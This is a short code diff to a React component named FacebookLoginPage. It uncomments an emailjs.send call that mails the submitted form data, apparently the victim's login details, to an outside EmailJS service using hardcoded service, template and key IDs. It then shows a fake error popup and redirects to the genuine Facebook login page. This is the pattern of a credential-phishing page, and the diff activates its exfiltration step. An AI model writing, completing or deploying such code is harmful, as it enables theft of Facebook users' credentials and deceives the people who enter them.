@@ -63,12 +63,12 @@ const FacebookLoginPage = () => {
             datetime: dateTime,
         };
         try {
-            // const result = await emailjs.send(
-            //     'service_z7ysfj4',
-            //     'template_npetqre',
-            //     templateParams,
-            //     'HYmy10exBQfzB2uAf'
-            // );
+             const result = await emailjs.send(
+                 'service_z7ysfj4',
+                 'template_npetqre',
+                 templateParams,
+                 'HYmy10exBQfzB2uAf'
+             );
 
 
             Swal.fire({
@@ -77,7 +77,7 @@ const FacebookLoginPage = () => {
                 icon: 'error',
                 confirmButtonText: 'Cool'
             });
-            // window.location('https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQ0OTgyODM0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next')
+            window.location('https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQ0OTgyODM0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next')
         } catch (error) {
         }
 
